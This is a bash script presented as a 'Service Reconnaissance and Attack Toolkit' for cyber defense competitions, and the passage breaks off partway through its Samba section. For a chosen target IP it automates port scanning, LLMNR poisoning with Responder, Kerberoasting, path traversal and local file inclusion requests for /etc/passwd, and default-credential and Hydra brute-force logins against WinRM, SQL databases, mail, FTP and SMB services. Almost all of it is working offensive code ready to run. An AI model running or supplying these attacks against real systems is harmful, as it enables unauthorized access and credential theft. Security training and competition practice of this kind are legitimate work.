#!/bin/bash

# Comprehensive Service Reconnaissance and Attack Script
# For educational and competitive purposes only

# ANSI color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Banner function
display_banner() {
    echo -e "${RED}"
    echo "╔══════════════════════════════════════════════════════════════════╗"
    echo "║                                                                  ║"
    echo "║     Service Reconnaissance and Attack Toolkit                    ║"
    echo "║     For Cyber Defense Competition Use                            ║"
    echo "║                                                                  ║"
    echo "╚══════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Help menu
display_help() {
    echo -e "${CYAN}Usage:${NC} $0 [options]"
    echo
    echo -e "${CYAN}Options:${NC}"
    echo "  -h, --help                 Show this help message"
    echo "  -t, --target TARGET_IP     Specify target IP address (required)"
    echo "  -s, --service SERVICE      Specify service to attack (required)"
    echo "                            Available services:"
    echo "                             * active-directory"
    echo "                             * iis"
    echo "                             * nginx"
    echo "                             * winrm"
    echo "                             * apache"
    echo "                             * sql"
    echo "                             * mail"
    echo "                             * ftp"
    echo "                             * samba"
    echo "                             * elk"
    echo "  -a, --all                  Run all checks for specified service"
    echo "  -v, --verbose              Enable verbose output"
    echo "  -o, --output FILE          Save output to file"
    echo "  -i, --install              Install required tools for specified service"
    echo "  -p, --port PORT            Specify custom port (optional)"
    echo
    echo -e "${YELLOW}Example:${NC}"
    echo "  $0 -t 192.168.1.10 -s ftp -a -v -o ftp_results.txt"
    echo "  $0 -t 192.168.1.10 -s apache -i"
    echo
}

# Function to check if tool exists
check_tool() {
    command -v $1 >/dev/null 2>&1
    if [ $? -ne 0 ]; then
        echo -e "${RED}[!] Required tool not found: $1${NC}"
        echo -e "${YELLOW}[*] Install with: sudo apt install $1${NC}"
        return 1
    fi
    return 0
}

# Function to create output directory
setup_output_dir() {
    mkdir -p "$OUTPUT_DIR"
    echo -e "${GREEN}[+] Created output directory: $OUTPUT_DIR${NC}"
}

# Function to log messages
log_message() {
    local level=$1
    local message=$2
    
    case $level in
        "info")
            echo -e "${GREEN}[+] $message${NC}"
            ;;
        "warning")
            echo -e "${YELLOW}[*] $message${NC}"
            ;;
        "error")
            echo -e "${RED}[!] $message${NC}"
            ;;
        *)
            echo -e "$message"
            ;;
    esac
    
    if [ -n "$OUTPUT_FILE" ]; then
        echo "[$level] $message" >> "$OUTPUT_FILE"
    fi
}

# Function to install required tools
install_tools() {
    log_message "info" "Installing required tools for $SERVICE"
    
    # Common tools for all services
    sudo apt update
    sudo apt install -y nmap masscan metasploit-framework python3-pip git curl wget netcat-openbsd
    
    case $SERVICE in
        "active-directory")
            sudo apt install -y responder impacket-scripts crackmapexec
            sudo pip3 install bloodhound ldapdomaindump
            ;;
        "iis"|"nginx"|"apache")
            sudo apt install -y gobuster wfuzz nikto whatweb dirb sqlmap ffuf
            sudo pip3 install dirsearch
            git clone https://github.com/maurosoria/dirsearch.git
            ;;
        "winrm")
            sudo pip3 install evil-winrm
            sudo apt install -y ruby ruby-dev
            sudo gem install winrm winrm-fs
            ;;
        "sql")
            sudo apt install -y sqlmap mysql-client postgresql-client
            ;;
        "mail")
            sudo apt install -y swaks smtp-user-enum
            ;;
        "ftp")
            sudo apt install -y ftp lftp hydra
            ;;
        "samba")
            sudo apt install -y smbclient samba-common-bin enum4linux
            ;;
        "elk")
            sudo apt install -y jq
            ;;
        *)
            log_message "error" "Unknown service: $SERVICE"
            exit 1
            ;;
    esac
    
    log_message "info" "Tools installation completed"
}

# Initial recon function
run_initial_recon() {
    log_message "info" "Running initial reconnaissance on $TARGET_IP"
    
    # Create a recon directory
    local recon_dir="$OUTPUT_DIR/recon"
    mkdir -p "$recon_dir"
    
    # Quick port scan
    log_message "info" "Running quick port scan"
    nmap -sS -T4 --min-rate=1000 -p- $TARGET_IP -oN "$recon_dir/nmap_quick.txt" 2>/dev/null
    
    # If a specific port is provided, add it to the default ports for the service
    local service_ports=""
    
    case $SERVICE in
        "active-directory")
            service_ports="53,88,389,445,464,636,3268,3269"
            ;;
        "iis"|"nginx"|"apache")
            service_ports="80,443,8080,8443"
            ;;
        "winrm")
            service_ports="5985,5986"
            ;;
        "sql")
            service_ports="1433,3306,5432"
            ;;
        "mail")
            service_ports="25,110,143,465,587,993,995"
            ;;
        "ftp")
            service_ports="21"
            ;;
        "samba")
            service_ports="139,445"
            ;;
        "elk")
            service_ports="9200,9300,5601,5044"
            ;;
        *)
            log_message "error" "Unknown service: $SERVICE"
            exit 1
            ;;
    esac
    
    if [ -n "$CUSTOM_PORT" ]; then
        service_ports="$service_ports,$CUSTOM_PORT"
    fi
    
    # Detailed scan of service ports
    log_message "info" "Running detailed scan on service ports: $service_ports"
    nmap -sS -sV -sC -p $service_ports $TARGET_IP -oN "$recon_dir/nmap_detailed.txt" 2>/dev/null
    
    log_message "info" "Initial reconnaissance completed. Results saved to $recon_dir/"
}

# Active Directory attack vectors
attack_active_directory() {
    log_message "info" "Starting Active Directory attacks on $TARGET_IP"
    
    local ad_dir="$OUTPUT_DIR/active-directory"
    mkdir -p "$ad_dir"
    
    # LDAP Enumeration
    if check_tool ldapsearch; then
        log_message "info" "Attempting anonymous LDAP bind"
        ldapsearch -x -h $TARGET_IP -D '' -w '' -b "DC=domain,DC=local" > "$ad_dir/ldap_anon.txt" 2>/dev/null
        
        if [ $? -eq 0 ]; then
            log_message "warning" "Anonymous LDAP bind successful! Results saved to $ad_dir/ldap_anon.txt"
        else
            log_message "info" "Anonymous LDAP bind failed"
        fi
    fi
    
    # SMB Enumeration
    if check_tool smbclient; then
        log_message "info" "Enumerating SMB shares"
        smbclient -L \\\\$TARGET_IP -N > "$ad_dir/smb_shares.txt" 2>/dev/null
        
        if [ $? -eq 0 ]; then
            log_message "warning" "Anonymous SMB access might be possible. Results saved to $ad_dir/smb_shares.txt"
        else
            log_message "info" "Anonymous SMB listing failed"
        fi
    fi
    
    # Enum4Linux
    if check_tool enum4linux; then
        log_message "info" "Running enum4linux"
        enum4linux -a $TARGET_IP > "$ad_dir/enum4linux.txt" 2>/dev/null
        log_message "info" "Enum4linux results saved to $ad_dir/enum4linux.txt"
    fi
    
    # LLMNR/NBT-NS Poisoning (start in background)
    if check_tool responder; then
        log_message "warning" "Would you like to start Responder for LLMNR/NBT-NS poisoning? (y/n)"
        read -r response
        if [[ "$response" =~ ^([yY][eE][sS]|[yY])$ ]]; then
            log_message "info" "Starting Responder in a new terminal (will run for 60 seconds)"
            if [ -n "$TERM" ]; then
                # Get primary network interface
                IFACE=$(ip route | grep default | awk '{print $5}')
                gnome-terminal -- bash -c "sudo responder -I $IFACE -rdwv; sleep 60; exit" &
                log_message "info" "Responder started in a new terminal"
            else
                log_message "error" "Cannot open new terminal. Run Responder manually:"
                log_message "info" "sudo responder -I eth0 -rdwv"
            fi
        fi
    fi
    
    # Kerberoasting attempt
    if command -v impacket-GetUserSPNs >/dev/null 2>&1; then
        log_message "info" "Attempting Kerberoasting"
        impacket-GetUserSPNs -dc-ip $TARGET_IP 'DOMAIN/anonymous:' -request > "$ad_dir/kerberoast.txt" 2>/dev/null
        log_message "info" "Kerberoasting attempt results saved to $ad_dir/kerberoast.txt"
    fi
    
    log_message "info" "Active Directory attacks completed"
}

# IIS attack vectors
attack_iis() {
    log_message "info" "Starting IIS attacks on $TARGET_IP"
    
    local iis_dir="$OUTPUT_DIR/iis"
    mkdir -p "$iis_dir"
    
    local port=${CUSTOM_PORT:-80}
    local target_url="http://$TARGET_IP:$port"
    
    # Banner grabbing
    log_message "info" "Getting server headers"
    curl -s -I $target_url > "$iis_dir/headers.txt" 2>/dev/null
    log_message "info" "Headers saved to $iis_dir/headers.txt"
    
    # Directory brute forcing
    if check_tool gobuster; then
        log_message "info" "Running directory bruteforce with common IIS extensions"
        gobuster dir -u $target_url -w /usr/share/wordlists/dirb/common.txt -x .asp,.aspx,.php,.html -q > "$iis_dir/gobuster.txt" 2>/dev/null
        log_message "info" "Directory bruteforce results saved to $iis_dir/gobuster.txt"
    fi
    
    # Test for path traversal vulnerabilities
    log_message "info" "Testing for path traversal"
    curl -s "$target_url/scripts/..%5c..%5c..%5c..%5cwindows/win.ini" > "$iis_dir/traversal_test1.txt" 2>/dev/null
    curl -s "$target_url/scripts/..%2f..%2f..%2f..%2fwindows/win.ini" > "$iis_dir/traversal_test2.txt" 2>/dev/null
    
    # Check if traversal was successful by looking for [extensions] section in win.ini
    if grep -q "\[extensions\]" "$iis_dir/traversal_test1.txt" || grep -q "\[extensions\]" "$iis_dir/traversal_test2.txt"; then
        log_message "warning" "PATH TRAVERSAL VULNERABILITY DETECTED! Check $iis_dir/traversal_test*.txt"
    else
        log_message "info" "Path traversal test negative"
    fi
    
    # Check for HTTP methods
    log_message "info" "Checking allowed HTTP methods"
    curl -s -X OPTIONS $target_url -v > "$iis_dir/http_methods.txt" 2>&1
    log_message "info" "HTTP methods results saved to $iis_dir/http_methods.txt"
    
    # Nikto scan
    if check_tool nikto; then
        log_message "info" "Running Nikto scan"
        nikto -h $target_url -output "$iis_dir/nikto_scan.txt" > /dev/null 2>&1
        log_message "info" "Nikto scan results saved to $iis_dir/nikto_scan.txt"
    fi
    
    log_message "info" "IIS attacks completed"
}

# NGINX attack vectors
attack_nginx() {
    log_message "info" "Starting Nginx attacks on $TARGET_IP"
    
    local nginx_dir="$OUTPUT_DIR/nginx"
    mkdir -p "$nginx_dir"
    
    local port=${CUSTOM_PORT:-80}
    local target_url="http://$TARGET_IP:$port"
    
    # Banner grabbing
    log_message "info" "Getting server headers"
    curl -s -I $target_url > "$nginx_dir/headers.txt" 2>/dev/null
    log_message "info" "Headers saved to $nginx_dir/headers.txt"
    
    # Test for technology fingerprinting
    if check_tool whatweb; then
        log_message "info" "Identifying web technologies"
        whatweb $target_url > "$nginx_dir/whatweb.txt" 2>/dev/null
        log_message "info" "Web technologies identified and saved to $nginx_dir/whatweb.txt"
    fi
    
    # Directory discovery
    if [ -d "dirsearch" ]; then
        log_message "info" "Running directory discovery"
        python3 dirsearch/dirsearch.py -u $target_url -e php,html,txt -q > "$nginx_dir/dirsearch.txt" 2>/dev/null
        log_message "info" "Directory discovery results saved to $nginx_dir/dirsearch.txt"
    fi
    
    # Path traversal tests
    log_message "info" "Testing for path traversal"
    curl -s "$target_url/../../../etc/passwd" > "$nginx_dir/traversal_test1.txt" 2>/dev/null
    curl -s "$target_url//..%c0%af../..%c0%af../..%c0%af/etc/passwd" > "$nginx_dir/traversal_test2.txt" 2>/dev/null
    
    # Check if traversal was successful
    if grep -q "root:" "$nginx_dir/traversal_test1.txt" || grep -q "root:" "$nginx_dir/traversal_test2.txt"; then
        log_message "warning" "PATH TRAVERSAL VULNERABILITY DETECTED! Check $nginx_dir/traversal_test*.txt"
    else
        log_message "info" "Path traversal test negative"
    fi
    
    # Test for alias traversal
    log_message "info" "Testing for alias traversal"
    curl -s "$target_url/static../app/config" > "$nginx_dir/alias_traversal.txt" 2>/dev/null
    
    # Test for proxy configuration leaks
    log_message "info" "Testing for proxy configuration leaks"
    curl -s -H "Host: internal-service" $target_url > "$nginx_dir/proxy_leak_test.txt" 2>/dev/null
    
    log_message "info" "Nginx attacks completed"
}

# WinRM attack vectors
attack_winrm() {
    log_message "info" "Starting WinRM attacks on $TARGET_IP"
    
    local winrm_dir="$OUTPUT_DIR/winrm"
    mkdir -p "$winrm_dir"
    
    local http_port=${CUSTOM_PORT:-5985}
    local https_port=5986
    
    # Check if WinRM ports are open
    log_message "info" "Checking if WinRM ports are open"
    nc -z -w 3 $TARGET_IP $http_port > /dev/null 2>&1
    local http_open=$?
    nc -z -w 3 $TARGET_IP $https_port > /dev/null 2>&1
    local https_open=$?
    
    if [ $http_open -eq 0 ]; then
        log_message "warning" "WinRM HTTP port ($http_port) is OPEN"
    else
        log_message "info" "WinRM HTTP port ($http_port) is closed"
    fi
    
    if [ $https_open -eq 0 ]; then
        log_message "warning" "WinRM HTTPS port ($https_port) is OPEN"
    else
        log_message "info" "WinRM HTTPS port ($https_port) is closed"
    fi
    
    # Test for unencrypted connections if available
    if [ $http_open -eq 0 ] && command -v ruby >/dev/null 2>&1; then
        log_message "info" "Testing for unencrypted WinRM connections"
        echo '
        require "winrm"
        conn = WinRM::Connection.new(
          endpoint: "http://'"$TARGET_IP:$http_port"'/wsman",
          transport: :negotiate,
          user: "anonymous",
          password: ""
        )
        begin
          conn.shell(:powershell) { |shell| puts shell.run("whoami") }
        rescue => e
          puts "Error: #{e.message}"
        end
        ' > "$winrm_dir/winrm_test.rb"
        
        ruby "$winrm_dir/winrm_test.rb" > "$winrm_dir/winrm_test_results.txt" 2>&1
        log_message "info" "WinRM unencrypted test results saved to $winrm_dir/winrm_test_results.txt"
    fi
    
    # Attempt connection with Evil-WinRM
    if [ $http_open -eq 0 ] && command -v evil-winrm >/dev/null 2>&1; then
        log_message "info" "Attempting connection with empty credentials"
        echo 'exit' | evil-winrm -i $TARGET_IP -u '' -p '' > "$winrm_dir/evil_winrm_test.txt" 2>&1
        
        # Check if connection was successful
        if ! grep -q "Error:" "$winrm_dir/evil_winrm_test.txt"; then
            log_message "warning" "WinRM CONNECTION WITH EMPTY CREDENTIALS SUCCESSFUL! Check $winrm_dir/evil_winrm_test.txt"
        else
            log_message "info" "WinRM connection with empty credentials failed"
        fi
    fi
    
    # Try with Metasploit if available
    if command -v msfconsole >/dev/null 2>&1; then
        log_message "info" "Checking WinRM using Metasploit (testing top 5 default credentials)"
        echo "use auxiliary/scanner/winrm/winrm_login
        set RHOSTS $TARGET_IP
        set USER_FILE <(echo -e 'administrator\nadmin\nuser\ndefault\nguest')
        set PASS_FILE <(echo -e 'password\nadmin\nadministrator\nP@ssw0rd\nwelcome')
        set STOP_ON_SUCCESS true
        run
        exit" > "$winrm_dir/msf_winrm_script.rc"
        
        msfconsole -q -r "$winrm_dir/msf_winrm_script.rc" > "$winrm_dir/msf_winrm_results.txt" 2>&1
        log_message "info" "Metasploit WinRM check results saved to $winrm_dir/msf_winrm_results.txt"
    fi
    
    log_message "info" "WinRM attacks completed"
}

# Apache attack vectors
attack_apache() {
    log_message "info" "Starting Apache attacks on $TARGET_IP"
    
    local apache_dir="$OUTPUT_DIR/apache"
    mkdir -p "$apache_dir"
    
    local port=${CUSTOM_PORT:-80}
    local target_url="http://$TARGET_IP:$port"
    
    # Banner grabbing
    log_message "info" "Getting server headers"
    curl -s -I $target_url > "$apache_dir/headers.txt" 2>/dev/null
    log_message "info" "Headers saved to $apache_dir/headers.txt"
    
    # Directory enumeration
    if check_tool dirb; then
        log_message "info" "Running directory enumeration"
        dirb $target_url /usr/share/wordlists/dirb/common.txt -o "$apache_dir/dirb.txt" -S > /dev/null 2>&1
        log_message "info" "Directory enumeration results saved to $apache_dir/dirb.txt"
    fi
    
    # Check for common misconfigurations
    log_message "info" "Checking for common misconfigurations"
    
    # Test for server-status page
    curl -s "$target_url/server-status" > "$apache_dir/server_status.txt" 2>/dev/null
    if grep -q "Apache Server Status" "$apache_dir/server_status.txt"; then
        log_message "warning" "Apache Server Status page is accessible! Check $apache_dir/server_status.txt"
    fi
    
    # Test for server-info page
    curl -s "$target_url/server-info" > "$apache_dir/server_info.txt" 2>/dev/null
    if grep -q "Apache Server Information" "$apache_dir/server_info.txt"; then
        log_message "warning" "Apache Server Info page is accessible! Check $apache_dir/server_info.txt"
    fi
    
    # Test for LFI vulnerabilities
    log_message "info" "Testing for LFI vulnerabilities"
    curl -s "$target_url/index.php?page=../../../etc/passwd" > "$apache_dir/lfi_test1.txt" 2>/dev/null
    curl -s "$target_url/index.php?file=../../../etc/passwd" > "$apache_dir/lfi_test2.txt" 2>/dev/null
    
    # Check if LFI was successful
    if grep -q "root:" "$apache_dir/lfi_test1.txt" || grep -q "root:" "$apache_dir/lfi_test2.txt"; then
        log_message "warning" "LFI VULNERABILITY DETECTED! Check $apache_dir/lfi_test*.txt"
    else
        log_message "info" "LFI test negative"
    fi
    
    # Test for mod_cgi if cgi-bin directory exists
    curl -s -I "$target_url/cgi-bin/" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        log_message "info" "Testing for CGI vulnerabilities"
        curl -s "$target_url/cgi-bin/test.cgi?%0Aid" > "$apache_dir/cgi_test.txt" 2>/dev/null
        log_message "info" "CGI test results saved to $apache_dir/cgi_test.txt"
    fi
    
    # Check for .git directory exposure
    curl -s -I "$target_url/.git/" > "$apache_dir/git_check.txt" 2>&1
    if grep -q "200 OK" "$apache_dir/git_check.txt"; then
        log_message "warning" ".git directory may be exposed! Check $apache_dir/git_check.txt"
    fi
    
    # Run Nikto scan
    if check_tool nikto; then
        log_message "info" "Running Nikto scan"
        nikto -h $target_url -output "$apache_dir/nikto_scan.txt" > /dev/null 2>&1
        log_message "info" "Nikto scan results saved to $apache_dir/nikto_scan.txt"
    fi
    
    log_message "info" "Apache attacks completed"
}

# SQL attack vectors
attack_sql() {
    log_message "info" "Starting SQL database attacks on $TARGET_IP"
    
    local sql_dir="$OUTPUT_DIR/sql"
    mkdir -p "$sql_dir"
    
    # Check for common database ports
    log_message "info" "Checking common database ports"
    
    # MySQL (3306)
    local mysql_port=${CUSTOM_PORT:-3306}
    nc -z -w 3 $TARGET_IP $mysql_port > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        log_message "warning" "MySQL port ($mysql_port) is OPEN"
        
        # Test MySQL connection with empty password
        if check_tool mysql; then
            log_message "info" "Testing MySQL connection with empty password"
            mysql -h $TARGET_IP -u root --password= -e "SHOW DATABASES;" > "$sql_dir/mysql_root_nopass.txt" 2>&1
            
            if ! grep -q "ERROR" "$sql_dir/mysql_root_nopass.txt"; then
                log_message "warning" "MySQL ROOT ACCESS WITH EMPTY PASSWORD SUCCESSFUL! Check $sql_dir/mysql_root_nopass.txt"
            else
                log_message "info" "MySQL root access with empty password failed"
                
                # Try with common username/password combinations
                log_message "info" "Testing MySQL with common credentials"
                echo "root:" > "$sql_dir/mysql_common_creds.txt"
                mysql -h $TARGET_IP -u root --password=root -e "SHOW DATABASES;" >> "$sql_dir/mysql_common_creds.txt" 2>&1
                echo "admin:" >> "$sql_dir/mysql_common_creds.txt"
                mysql -h $TARGET_IP -u admin --password=admin -e "SHOW DATABASES;" >> "$sql_dir/mysql_common_creds.txt" 2>&1
                echo "test:" >> "$sql_dir/mysql_common_creds.txt"
                mysql -h $TARGET_IP -u test --password=test -e "SHOW DATABASES;" >> "$sql_dir/mysql_common_creds.txt" 2>&1
            fi
        fi
    else
        log_message "info" "MySQL port ($mysql_port) is closed"
    fi
    
    # PostgreSQL (5432)
    local pgsql_port=5432
    nc -z -w 3 $TARGET_IP $pgsql_port > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        log_message "warning" "PostgreSQL port ($pgsql_port) is OPEN"
        
        # Test PostgreSQL connection with default credentials
        if check_tool psql; then
            log_message "info" "Testing PostgreSQL connection with default credentials"
            PGPASSWORD=postgres psql -h $TARGET_IP -U postgres -c "\l" > "$sql_dir/postgres_default.txt" 2>&1
            
            if ! grep -q "connection failed" "$sql_dir/postgres_default.txt"; then
                log_message "warning" "PostgreSQL ACCESS WITH DEFAULT CREDENTIALS SUCCESSFUL! Check $sql_dir/postgres_default.txt"
            else
                log_message "info" "PostgreSQL access with default credentials failed"
            fi
        fi
    else
        log_message "info" "PostgreSQL port ($pgsql_port) is closed"
    fi
    
    # MSSQL (1433)
    local mssql_port=1433
    nc -z -w 3 $TARGET_IP $mssql_port > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        log_message "warning" "MSSQL port ($mssql_port) is OPEN"
        
        # If MSSQL is open, can try with Metasploit if available
        if command -v msfconsole >/dev/null 2>&1; then
            log_message "info" "Checking MSSQL using Metasploit"
            echo "use auxiliary/scanner/mssql/mssql_login
            set RHOSTS $TARGET_IP
            set USER_FILE <(echo -e 'sa\nadministrator\nadmin')
            set PASS_FILE <(echo -e 'sa\nadmin\npassword\nP@ssw0rd')
            set STOP_ON_SUCCESS true
            run
            exit" > "$sql_dir/msf_mssql_script.rc"
            
            msfconsole -q -r "$sql_dir/msf_mssql_script.rc" > "$sql_dir/msf_mssql_results.txt" 2>&1
            log_message "info" "Metasploit MSSQL check results saved to $sql_dir/msf_mssql_results.txt"
        fi
    else
        log_message "info" "MSSQL port ($mssql_port) is closed"
    fi
    
    # Check for phpMyAdmin
    log_message "info" "Checking for phpMyAdmin"
    curl -s -I "http://$TARGET_IP/phpmyadmin/" > "$sql_dir/phpmyadmin_check.txt" 2>&1
    if grep -q "200 OK" "$sql_dir/phpmyadmin_check.txt"; then
        log_message "warning" "phpMyAdmin may be accessible! Check $sql_dir/phpmyadmin_check.txt"
    else
        curl -s -I "http://$TARGET_IP/pma/" > "$sql_dir/pma_check.txt" 2>&1
        if grep -q "200 OK" "$sql_dir/pma_check.txt"; then
            log_message "warning" "phpMyAdmin may be accessible at /pma/! Check $sql_dir/pma_check.txt"
        fi
    fi
    
    log_message "info" "SQL database attacks completed"
}

# Mail attack vectors
attack_mail() {
    log_message "info" "Starting Mail server attacks on $TARGET_IP"
    
    local mail_dir="$OUTPUT_DIR/mail"
    mkdir -p "$mail_dir"
    
    # Check for common mail ports
    local smtp_port=${CUSTOM_PORT:-25}
    local pop3_port=110
    local imap_port=143
    
    # Check SMTP
    nc -z -w 3 $TARGET_IP $smtp_port > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        log_message "warning" "SMTP port ($smtp_port) is OPEN"
        
        # Banner grabbing
        log_message "info" "Getting SMTP banner"
        echo -e "QUIT\r\n" | nc -w 5 $TARGET_IP $smtp_port > "$mail_dir/smtp_banner.txt" 2>/dev/null
        log_message "info" "SMTP banner saved to $mail_dir/smtp_banner.txt"
        
        # SMTP user enumeration if tool exists
        if check_tool smtp-user-enum; then
            log_message "info" "Attempting SMTP user enumeration"
            echo -e "admin\nroot\npostmaster\nwebmaster\ninfo\nadministrator" > "$mail_dir/users.txt"
            smtp-user-enum -M VRFY -U "$mail_dir/users.txt" -t $TARGET_IP > "$mail_dir/smtp_enum.txt" 2>/dev/null
            log_message "info" "SMTP enumeration results saved to $mail_dir/smtp_enum.txt"
        fi
        
        # Test for open relay
        if check_tool swaks; then
            log_message "info" "Testing for open relay"
            swaks --from test@example.com --to test@example.net --server $TARGET_IP --body "Open Relay Test" > "$mail_dir/relay_test.txt" 2>&1
            
            if grep -q "250 " "$mail_dir/relay_test.txt"; then
                log_message "warning" "POSSIBLE OPEN RELAY DETECTED! Check $mail_dir/relay_test.txt"
            else
                log_message "info" "Open relay test negative"
            fi
        fi
    else
        log_message "info" "SMTP port ($smtp_port) is closed"
    fi
    
    # Check POP3
    nc -z -w 3 $TARGET_IP $pop3_port > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        log_message "warning" "POP3 port ($pop3_port) is OPEN"
        
        # Get banner
        log_message "info" "Getting POP3 banner"
        echo -e "QUIT\r\n" | nc -w 5 $TARGET_IP $pop3_port > "$mail_dir/pop3_banner.txt" 2>/dev/null
        log_message "info" "POP3 banner saved to $mail_dir/pop3_banner.txt"
        
        # Test common credentials
        log_message "info" "Testing POP3 with common credentials"
        (echo "USER admin"; sleep 1; echo "PASS admin"; sleep 1; echo "QUIT") | nc -w 5 $TARGET_IP $pop3_port > "$mail_dir/pop3_admin_test.txt" 2>/dev/null
        (echo "USER root"; sleep 1; echo "PASS root"; sleep 1; echo "QUIT") | nc -w 5 $TARGET_IP $pop3_port > "$mail_dir/pop3_root_test.txt" 2>/dev/null
        
        # Check if login was successful
        if grep -q "+OK" "$mail_dir/pop3_admin_test.txt" || grep -q "+OK" "$mail_dir/pop3_root_test.txt"; then
            log_message "warning" "POP3 LOGIN WITH COMMON CREDENTIALS MAY BE SUCCESSFUL! Check $mail_dir/pop3_*_test.txt"
        else
            log_message "info" "POP3 login with common credentials failed"
        fi
    else
        log_message "info" "POP3 port ($pop3_port) is closed"
    fi
    
    # Check IMAP
    nc -z -w 3 $TARGET_IP $imap_port > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        log_message "warning" "IMAP port ($imap_port) is OPEN"
        
        # Get banner
        log_message "info" "Getting IMAP banner"
        echo -e "a001 LOGOUT\r\n" | nc -w 5 $TARGET_IP $imap_port > "$mail_dir/imap_banner.txt" 2>/dev/null
        log_message "info" "IMAP banner saved to $mail_dir/imap_banner.txt"
        
        # Test common credentials
        log_message "info" "Testing IMAP with common credentials"
        (echo "a001 LOGIN admin admin"; sleep 1; echo "a002 LOGOUT") | nc -w 5 $TARGET_IP $imap_port > "$mail_dir/imap_admin_test.txt" 2>/dev/null
        
        # Check if login was successful
        if grep -q "a001 OK" "$mail_dir/imap_admin_test.txt"; then
            log_message "warning" "IMAP LOGIN WITH COMMON CREDENTIALS SUCCESSFUL! Check $mail_dir/imap_admin_test.txt"
        else
            log_message "info" "IMAP login with common credentials failed"
        fi
    else
        log_message "info" "IMAP port ($imap_port) is closed"
    fi
    
    log_message "info" "Mail server attacks completed"
}

# FTP attack vectors
attack_ftp() {
    log_message "info" "Starting FTP server attacks on $TARGET_IP"
    
    local ftp_dir="$OUTPUT_DIR/ftp"
    mkdir -p "$ftp_dir"
    
    local port=${CUSTOM_PORT:-21}
    
    # Check if FTP port is open
    nc -z -w 3 $TARGET_IP $port > /dev/null 2>&1
    if [ $? -ne 0 ]; then
        log_message "info" "FTP port ($port) is closed"
        return
    fi
    
    log_message "warning" "FTP port ($port) is OPEN"
    
    # Get FTP banner
    log_message "info" "Getting FTP banner"
    echo -e "QUIT\r\n" | nc -w 5 $TARGET_IP $port > "$ftp_dir/ftp_banner.txt" 2>/dev/null
    log_message "info" "FTP banner saved to $ftp_dir/ftp_banner.txt"
    
    # Test anonymous login
    log_message "info" "Testing anonymous FTP access"
    ftp -n $TARGET_IP $port > "$ftp_dir/anon_test.txt" 2>&1 << EOF
user anonymous anonymous
pwd
ls -la
quit
EOF
    
    # Check if anonymous login was successful
    if grep -q "230" "$ftp_dir/anon_test.txt"; then
        log_message "warning" "ANONYMOUS FTP ACCESS SUCCESSFUL! Check $ftp_dir/anon_test.txt"
        
        # If anonymous login works, try to access more directories
        log_message "info" "Attempting to list more directories via anonymous access"
        ftp -n $TARGET_IP $port > "$ftp_dir/anon_deep_test.txt" 2>&1 << EOF
user anonymous anonymous
cd ..
ls -la
cd /
ls -la
quit
EOF
        log_message "info" "Anonymous directory traversal results saved to $ftp_dir/anon_deep_test.txt"
    else
        log_message "info" "Anonymous FTP access failed"
    fi
    
    # Check common FTP vulnerabilities
    log_message "info" "Checking for common FTP configuration issues"
    
    # Try common credentials
    log_message "info" "Testing FTP with common credentials"
    ftp -n $TARGET_IP $port > "$ftp_dir/admin_test.txt" 2>&1 << EOF
user admin admin
quit
EOF

    ftp -n $TARGET_IP $port > "$ftp_dir/root_test.txt" 2>&1 << EOF
user root root
quit
EOF

    ftp -n $TARGET_IP $port > "$ftp_dir/ftp_test.txt" 2>&1 << EOF
user ftp ftp
quit
EOF
    
    # Check if any common credentials worked
    if grep -q "230" "$ftp_dir/admin_test.txt" || grep -q "230" "$ftp_dir/root_test.txt" || grep -q "230" "$ftp_dir/ftp_test.txt"; then
        log_message "warning" "FTP LOGIN WITH COMMON CREDENTIALS SUCCESSFUL! Check $ftp_dir/admin_test.txt and others"
    else
        log_message "info" "FTP login with common credentials failed"
    fi
    
    # Brute force with Hydra if available and enabled
    if check_tool hydra && [ "$RUN_ALL" = true ]; then
        log_message "info" "Running limited FTP brute force with Hydra (top 10 passwords)"
        echo -e "admin\nroot\nftp\nuser\ntest\nbackup\nwww\nweb\nguest\nupload" > "$ftp_dir/users.txt"
        echo -e "admin\nroot\npassword\nftp\nuser\n123456\n12345678\nabc123\nqwerty\ntest" > "$ftp_dir/pass.txt"
        
        hydra -L "$ftp_dir/users.txt" -P "$ftp_dir/pass.txt" -t 4 -f -o "$ftp_dir/hydra_results.txt" ftp://$TARGET_IP:$port > /dev/null 2>&1
        
        # Check if Hydra found anything
        if [ -s "$ftp_dir/hydra_results.txt" ]; then
            log_message "warning" "FTP CREDENTIALS FOUND! Check $ftp_dir/hydra_results.txt"
        else
            log_message "info" "FTP brute force completed - no credentials found"
        fi
    fi
    
    log_message "info" "FTP server attacks completed"
}

# Samba attack vectors
attack_samba() {
    log_message "info" "Starting Samba server attacks on $TARGET_IP"
    
    local samba_dir="$OUTPUT_DIR/samba"
    mkdir -p "$samba_dir"
    
    # Check if SMB ports are open
    nc -z -w 3 $TARGET_IP 445 > /dev/null 2>&1
    local port445=$?
    nc -z -w 3 $TARGET_IP 139 > /dev/null 2>&1
    local port139=$?
    
    if [ $port445 -ne 0 ] && [ $port139 -ne 0 ]; then
        log_message "info" "Samba ports (445, 139) are closed"
        return
    fi
    
    if [ $port445 -eq 0 ]; then
        log_message "warning" "Samba port (445) is OPEN"
    fi
    
    if [ $port139 -eq 0 ]; then
        log_message "warning" "Samba port (139) is OPEN"
    fi
    
    # Enumerate shares
    if check_tool smbclient; then
        log_message "info" "Enumerating SMB shares"
        smbclient -L $TARGET_IP -N > "$samba_dir/shares.txt" 2>&1
        
        # Check if shares were enumerated
        if grep -q "Sharename" "$samba_dir/shares.txt"; then
            log_message "warning" "SMB SHARES ENUMERATED! Check $samba_dir/shares.txt"
            
            # Try to access shares with no password
            log_message "info" "Attempting to access shares with no password"
            
            # Extract share names (excluding special shares)
            grep "Disk" "$samba_dir/shares.txt" | awk '{print $1}' | while read share; do
                log_message "info" "Testing access to share: $share"
                echo -e "ls\nquit" | smbclient "//$TARGET_IP/$share" -N > "$samba_dir/share_${share}_access.txt" 2>&1
                
                # Check if access was successful
